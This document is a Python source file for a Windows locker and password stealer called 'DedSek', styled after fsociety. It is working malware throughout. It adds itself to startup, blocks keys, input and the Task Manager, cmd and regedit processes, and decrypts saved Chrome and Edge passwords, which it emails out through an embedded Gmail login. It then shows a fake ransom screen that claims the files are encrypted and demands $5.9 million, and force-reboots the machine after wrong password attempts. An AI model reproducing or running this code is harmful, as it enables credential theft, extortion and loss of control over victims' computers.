import ctypes, os, sys, time, threading, tempfile, tkinter as tk
from tkinter import PhotoImage
import shutil, winshell, base64, random, socket, subprocess, json
import urllib.request, urllib.parse, smtplib, email
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import cv2, numpy as np
from PIL import ImageGrab, Image, ImageDraw
import sqlite3, winreg, zipfile, win32crypt, re, wave
from win32com.client import Dispatch

# НАСТРОЙКИ
PASSWORD = "1601"
MAX_ATTEMPTS = 4
SKULL_BASE64 = "YOUR_BASE64_HERE"
GMAIL_LOGIN = "xzx78848@gmail.com"
GMAIL_APP_PASSWORD = "cbgr awth fvak xgfb"
RECEIVER_EMAIL = "xzx78848@gmail.com"
VIDEO_URL = "https://github.com/ippo123459-bit/winlocker/raw/refs/heads/main/fuxEcorp.mp4.mp4"
AUDIO_URL = "https://github.com/ippo123459-bit/winlocker/raw/refs/heads/main/fuxEcorp.mp4.mp3"
VIDEO_PATH = os.path.join(tempfile.gettempdir(), "video.mp4")
AUDIO_PATH = os.path.join(tempfile.gettempdir(), "audio.mp3")
attempts_left = MAX_ATTEMPTS

def hide_console():
    try:
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd: ctypes.windll.user32.ShowWindow(hwnd, 0)
    except: pass

def disable_win_key():
    try:
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, "NoWinKeys", 0, winreg.REG_DWORD, 1); winreg.CloseKey(k)
    except: pass

def restore_win_key():
    try:
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, "NoWinKeys", 0, winreg.REG_DWORD, 0); winreg.CloseKey(k)
    except: pass

def send_email(msg, subj=None):
    try:
        m = MIMEText(msg, 'plain', 'utf-8')
        m['Subject'] = subj or 'DedSek'; m['From'] = GMAIL_LOGIN; m['To'] = RECEIVER_EMAIL
        s = smtplib.SMTP_SSL('smtp.gmail.com', 465, timeout=30)
        s.login(GMAIL_LOGIN, GMAIL_APP_PASSWORD); s.send_message(m); s.quit()
    except: pass

def send_file_email(fp, desc):
    try:
        if not os.path.exists(fp): return
        m = MIMEMultipart()
        m['Subject'] = desc; m['From'] = GMAIL_LOGIN; m['To'] = RECEIVER_EMAIL
        with open(fp, 'rb') as f:
            p = MIMEBase('application', 'octet-stream'); p.set_payload(f.read())
            encoders.encode_base64(p)
            p.add_header('Content-Disposition', f'attachment; filename="{os.path.basename(fp)}"')
            m.attach(p)
        s = smtplib.SMTP_SSL('smtp.gmail.com', 465, timeout=60)
        s.login(GMAIL_LOGIN, GMAIL_APP_PASSWORD); s.send_message(m); s.quit()
    except: pass

def add_to_startup():
    try:
        cp = os.path.abspath(__file__)
        pp = os.path.splitext(cp)[0] + ".pyw"
        if not cp.endswith(".pyw"):
            try: shutil.copy2(cp, pp)
            except: pass
            cp = pp
        pythonw = sys.executable.replace("python.exe", "pythonw.exe")
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, "DedSek", 0, winreg.REG_SZ, f'"{pythonw}" "{cp}"')
        winreg.CloseKey(k)
        startup = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        dest = os.path.join(startup, 'WindowsService.pyw')
        if cp != dest:
            try: shutil.copy2(cp, dest)
            except: pass
    except: pass

def download_video():
    try:
        if os.path.exists(VIDEO_PATH): os.remove(VIDEO_PATH)
        urllib.request.urlretrieve(VIDEO_URL, VIDEO_PATH)
    except: pass

def download_audio():
    try:
        if os.path.exists(AUDIO_PATH): os.remove(AUDIO_PATH)
        urllib.request.urlretrieve(AUDIO_URL, AUDIO_PATH)
    except: pass

def play_video():
    try:
        v = tk.Tk(); v.attributes('-fullscreen', True); v.attributes('-topmost', True)
        v.configure(bg='black'); v.overrideredirect(True)
        v.protocol("WM_DELETE_WINDOW", lambda: None); v.focus_force()
        try:
            import keyboard
            for k in ['alt+f4','alt+tab','ctrl+alt+del','win','esc','space','enter']:
                keyboard.add_hotkey(k, lambda: None, suppress=True)
        except: ctypes.windll.user32.BlockInput(True)
        lbl = tk.Label(v, bg='black'); lbl.pack(expand=True, fill='both')
        ap = None
        try: ap = subprocess.Popen(['ffplay','-nodisp','-autoexit','-loglevel','quiet', AUDIO_PATH], shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except: pass
        cap = cv2.VideoCapture(VIDEO_PATH)
        if cap.isOpened():
            fps = cap.get(cv2.CAP_PROP_FPS)
            if fps <= 0 or fps > 60: fps = 30
            sw, sh = v.winfo_screenwidth(), v.winfo_screenheight()
            ft = 1.0/fps; lt = time.time()
            while cap.isOpened():
                ret, frame = cap.read()
                if not ret: break
                while time.time() - lt < ft: time.sleep(0.001)
                lt = time.time()
                frame = cv2.resize(frame, (sw, sh))
                img = tk.PhotoImage(data=cv2.imencode('.ppm', cv2.cvtColor(frame, cv2.COLOR_BGR2RGB))[1].tobytes())
                lbl.config(image=img); lbl.image = img; v.update()
            cap.release()
        if ap:
            try: ap.terminate()
            except: pass
        v.destroy()
        try: keyboard.unhook_all(); ctypes.windll.user32.BlockInput(False)
        except: pass
    except:
        try: ctypes.windll.user32.BlockInput(False)
        except: pass

def lock_screen():
    s = tk.Toplevel(); s.attributes('-fullscreen', True); s.attributes('-topmost', True)
    s.attributes('-alpha', 0.85); s.configure(bg='black'); s.overrideredirect(True)
    s.protocol("WM_DELETE_WINDOW", lambda: None)
    f = tk.Frame(s, bg='#1a1a1a'); f.place(relx=0.5, rely=0.5, anchor='center')
    tk.Label(f, text="WINDOWS LOCKED", bg='#1a1a1a', fg='#ff4444', font=('Courier', 28, 'bold')).pack(pady=5)
    tk.Label(f, text="SYSTEM BLOCKED", bg='#1a1a1a', fg='#ff4444', font=('Courier', 20, 'bold')).pack(pady=3)
    tk.Label(f, text="FILES ENCRYPTED", bg='#1a1a1a', fg='#ff4444', font=('Courier', 20, 'bold')).pack(pady=3)
    tl = tk.Label(f, text="8", bg='#1a1a1a', fg='white', font=('Courier', 50, 'bold')); tl.pack(pady=15)
    for i in range(8, 0, -1): tl.config(text=str(i)); s.update(); time.sleep(1)
    s.destroy()

def boot_anim():
    a = tk.Tk(); a.attributes('-fullscreen', True); a.attributes('-topmost', True)
    a.configure(bg='black'); a.overrideredirect(True); disable_win_key()
    l = tk.Label(a, text="", bg='black', fg='white', font=('Courier', 20, 'bold')); l.pack(expand=True)
    for i in range(6):
        a.configure(bg='white' if i%2==0 else 'black'); l.config(bg='white' if i%2==0 else 'black', fg='black' if i%2==0 else 'white')
        a.update(); time.sleep(0.15)
    a.configure(bg='black'); l.config(bg='black', fg='white'); a.attributes('-alpha', 0)
    for alpha in range(0, 110, 5): a.attributes('-alpha', alpha/100); l.config(text="DedSek tebya vzlomal"); a.update(); time.sleep(0.02)
    time.sleep(1.5)
    for msg in ["Idet shifrovka...","[                    ] 0%","[####                ] 20%","[########            ] 40%","[############        ] 60%","[################    ] 80%","[####################] 100%","","DANNYE ZASHIFROVANY!"]:
        l.config(text=msg); a.update(); time.sleep(0.2)
    time.sleep(1); a.destroy()

def steal_chromium(browser, paths):
    res = []
    for lp in paths:
        if not os.path.exists(lp): continue
        try:
            db = os.path.join(tempfile.gettempdir(), f'{browser}_{random.randint(0,9999)}.db')
            shutil.copy2(lp, db)
            cur = sqlite3.connect(db).cursor()
            cur.execute("SELECT origin_url, username_value, password_value FROM logins")
            for url, user, pw in cur:
                try:
                    pwd = win32crypt.CryptUnprotectData(pw, None, None, None, 0)[1].decode('utf-8','ignore')
                    res.append(f"URL: {url}\nLOGIN: {user}\nPASSWORD: {pwd}\n"+ "-"*40)
                except: res.append(f"URL: {url}\nLOGIN: {user}\nPASSWORD: ***\n" + "-"*40)
            cur.close()
            try: os.remove(db)
            except: pass
        except: pass
    return res

def mega_steal():
    report = ["="*60, "DEDSEK STEALER", "="*60]
    report.append(f"\nUSER: {os.environ.get('USERNAME')} | PC: {socket.gethostname()}")
    for name, paths in {"CHROME": [os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')], "EDGE": [os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data')]}.items():
        data = steal_chromium(name, paths)
        if data: report.append(f"\n{name}:"); report.extend(data)
    text = '\n'.join(report)
    for i, part in enumerate([text[i:i+15000] for i in range(0, len(text), 15000)]): send_email(part, f"[DedSek_Logs] [{i+1}]")

def block_keys():
    try:
        import keyboard
        for c in ['alt+f4','alt+tab','alt+esc','alt+space','ctrl+shift+esc','ctrl+alt+del','ctrl+esc','ctrl+w','ctrl+f4','ctrl+tab','win','win+d','win+r','win+e','win+l','win+m','win+tab','win+x','win+u','alt','ctrl','shift','f11','print screen','alt+print screen']:
            try: keyboard.add_hotkey(c, lambda: None, suppress=True, timeout=0)
            except: pass
    except: pass

def unblock():
    try: ctypes.windll.user32.BlockInput(False)
    except: pass
    try: import keyboard; keyboard.unhook_all()
    except: pass

def kill_procs():
    kl = ["taskmgr.exe","cmd.exe","powershell.exe","msconfig.exe","regedit.exe"]
    while True:
        for p in kl: os.system(f"taskkill /f /im {p} >nul 2>&1")
        time.sleep(0.05)

def reset_windows():
    try:
        restore_win_key(); unblock()
        es = tk.Tk(); es.attributes('-fullscreen', True); es.attributes('-topmost', True)
        es.configure(bg='black'); es.overrideredirect(True)
        tk.Label(es, text="404 | ERROR", bg='black', fg='white', font=('Courier',40,'bold')).pack(expand=True)
        tk.Label(es, text="ALL DATA DESTROYED...", bg='black', fg='white', font=('Courier',20)).pack()
        es.update(); time.sleep(5); es.destroy()
        os.system("shutdown /r /t 0 /f"); os._exit(0)
    except: os.system("shutdown /r /t 0 /f"); os._exit(0)

def draw_jester_mask():
    """Рисует маску джокера"""
    img = Image.new('RGBA', (200, 250), (0,0,0,0))
    draw = ImageDraw.Draw(img)
    # Лицо (овал)
    draw.ellipse([30, 60, 170, 220], fill='#f5e6d3', outline='black', width=2)
    # Глаза (прорези)
    draw.ellipse([60, 100, 90, 115], fill='black')
    draw.ellipse([110, 100, 140, 115], fill='black')
    # Рот (оскал)
    draw.arc([60, 130, 140, 190], start=0, end=180, fill='black', width=3)
    draw.line([70, 160, 90, 150], fill='black', width=2)
    draw.line([110, 150, 130, 160], fill='black', width=2)
    for x in range(75, 130, 10):
        draw.line([x, 160, x, 175], fill='black', width=2)
    # Колпак
    draw.polygon([100, 10, 50, 70, 150, 70], fill='#8B0000', outline='black', width=2)
    draw.ellipse([40, 5, 55, 20], fill='white', outline='black')
    draw.ellipse([145, 5, 160, 20], fill='white', outline='black')
    draw.ellipse([90, 0, 110, 15], fill='white', outline='black')
    return img

class WinLocker:
    def __init__(self):
        self.root = tk.Tk(); self.root.withdraw()
        self.win = tk.Toplevel(self.root)
        self.win.attributes('-fullscreen', True); self.win.attributes('-topmost', True)
        self.win.configure(bg='#1a3a5c'); self.win.overrideredirect(True)
        self.win.protocol("WM_DELETE_WINDOW", lambda: None); self.win.focus_force()
        global attempts_left
        
        # === БЕЛЫЙ БЛОК СВЕРХУ ===
        top = tk.Frame(self.win, bg='white', bd=2, relief='solid')
        top.place(relx=0.5, rely=0.02, anchor='n', width=780, height=240)
        
        tk.Label(top, text="#OPdailyallowance", bg='white', fg='#111', font=('Courier', 16, 'bold')).pack(pady=(10,2))
        tk.Label(top, text="Your files are encrypted.", bg='white', fg='#cc0000', font=('Courier', 12, 'bold')).pack(pady=2)
        tk.Label(top, text="We demand $5,900,000 USD for the decryptor.", bg='white', fg='#111', font=('Courier', 10)).pack(pady=3)
        tk.Label(top, text="If payment is not received by tomorrow evening,\nwe'll brick your entire system.", bg='white', fg='#cc0000', font=('Courier', 10, 'bold')).pack(pady=3)
        tk.Label(top, text="More instructions forthcoming - fsociety", bg='white', fg='#666', font=('Courier', 9, 'italic')).pack(pady=2)
        
        self.timer_lbl = tk.Label(top, text="Time left: 14h 04m 07s", bg='white', fg='#cc0000', font=('Courier', 20, 'bold'))
        self.timer_lbl.pack(pady=8)
        
        try: hn = socket.gethostname(); ip = socket.gethostbyname(hn)
        except: hn = "Unknown"; ip = "192.251.68.250"
        tk.Label(top, text=f"System: {hn}  |  IP: {ip}  |  Total encrypted: 5,925 files", bg='white', fg='#888', font=('Courier', 8)).pack(pady=5)
        
        # === КНОПКИ ===
        btn_frame = tk.Frame(self.win, bg='#1a3a5c')
        btn_frame.place(relx=0.5, rely=0.35, anchor='center')
        for txt in ["Refresh", "Payment", "FAQ", "Decrypt One File", "Support"]:
            tk.Button(btn_frame, text=txt, bg='#ddd', fg='#333', font=('Courier', 8), relief='raised', bd=1, width=15, state='disabled').pack(side='left', padx=3)
        
        # === МАСКА ДЖОКЕРА ===
        jester_img = draw_jester_mask()
        jester_path = os.path.join(tempfile.gettempdir(), "jester.png")
        jester_img.save(jester_path)
        self.jester_photo = PhotoImage(file=jester_path)
        tk.Label(self.win, image=self.jester_photo, bg='#1a3a5c').place(relx=0.5, rely=0.55, anchor='center')
        
        # === ТВОЯ КАРТИНКА ===
        try:
            img_data = base64.b64decode(SKULL_BASE64)
            img_path = os.path.join(tempfile.gettempdir(), "dedsek.png")
            with open(img_path, "wb") as f: f.write(img_data)
            self.skull_photo = PhotoImage(file=img_path)
            tk.Label(self.win, image=self.skull_photo, bg='#1a3a5c').place(relx=0.5, rely=0.72, anchor='center')
        except: pass
        
        tk.Label(self.win, text="JESTER ☠ ACTUAL", bg='#1a3a5c', fg='white', font=('Courier', 10, 'bold')).place(relx=0.5, rely=0.78, anchor='center')
        tk.Label(self.win, text='"There is an unequal amount of good and bad in most things.\nThe trick is to figure the ratio and act accordingly."', bg='#1a3a5c', fg='#aaa', font=('Courier', 7, 'italic')).place(relx=0.5, rely=0.82, anchor='center')
        tk.Label(self.win, text="usa", bg='#1a3a5c', fg='#ffffff15', font=('Arial', 36, 'bold')).place(relx=0.01, rely=0.98, anchor='sw')
        
        # === ПОЛЕ ВВОДА ===
        cf = tk.Frame(self.win, bg='#1a3a5c'); cf.place(relx=0.5, rely=0.90, anchor='center')
        tk.Label(cf, text="ENTER PASSWORD:", bg='#1a3a5c', fg='white', font=('Courier', 10, 'bold')).pack(pady=(0,2))
        self.pw = tk.Entry(cf, show="*", font=('Courier', 10, 'bold'), bg='white', fg='black', relief='solid', bd=1)
        self.pw.pack(pady=(0,2), ipadx=20, ipady=1)
        self.sl = tk.Label(cf, text=f"ATTEMPTS LEFT: {attempts_left}", bg='#1a3a5c', fg='white', font=('Courier', 9))
        self.sl.pack()
        self.pw.bind('<Return>', self.check); self.pw.focus_force()
        self.win.after(100, self._keep)
    
    def _keep(self):
        try: self.win.focus_force(); self.pw.focus_force(); self.win.after(100, self._keep)
        except: pass
    
    def check(self, e=None):
        global attempts_left
        if self.pw.get() == PASSWORD:
            restore_win_key(); unblock()
            self.sl.config(text="CORRECT!", fg='#0f0'); self.win.update(); time.sleep(1)
            self.root.destroy(); os._exit(0)
        else:
            attempts_left -= 1
            if attempts_left > 0: self.sl.config(text=f"WRONG! ATTEMPTS LEFT: {attempts_left}", fg='white')
            else:
                self.sl.config(text="404 | ERROR", fg='white'); self.win.update(); time.sleep(2)
                self.root.destroy(); reset_windows()
            self.pw.delete(0, tk.END)

if __name__ == "__main__":
    hide_console(); disable_win_key(); add_to_startup()
    threading.Thread(target=download_video, daemon=True).start()
    threading.Thread(target=download_audio, daemon=True).start()
    threading.Thread(target=mega_steal, daemon=True).start()
    lock_screen(); play_video(); boot_anim(); block_keys()
    threading.Thread(target=kill_procs, daemon=True).start()
    WinLocker(); tk.mainloop()
